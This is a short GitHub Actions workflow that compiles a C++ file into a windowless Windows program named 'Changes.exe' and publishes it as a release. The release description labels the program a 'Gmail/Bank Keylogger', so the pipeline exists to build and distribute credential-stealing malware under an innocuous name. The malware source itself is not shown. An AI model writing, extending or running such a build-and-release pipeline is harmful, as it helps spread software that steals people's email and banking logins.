name: Auto-Compile Changes.exe

on: 
  push:
    branches: [ main ]
  workflow_dispatch:  # Manual trigger button

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Setup MSVC
      uses: microsoft/setup-msbuild@v2
    
    - name: Compile Changes.exe
      run: |
        cl /O2 /MT /DNDEBUG /Fe:dist/Changes.exe Changes.cpp winhttp.lib user32.lib shell32.lib ole32.lib /link /SUBSYSTEM:WINDOWS /NODEFAULTLIB /ENTRY:wWinMainCRTStartup /OPT:REF /OPT:ICF /RELEASE
        
    - name: Upload Artifact
      uses: actions/upload-artifact@v4
      with:
        name: Changes.exe
        path: dist/Changes.exe
        
    - name: Create Release
      uses: softprops/action-gh-release@v2
      if: github.event_name == 'workflow_dispatch'
      with:
        tag_name: v1.0.${{ github.run_number }}
        files: dist/Changes.exe
        body: "**Changes.exe** - Gmail/Bank Keylogger (42KB)"
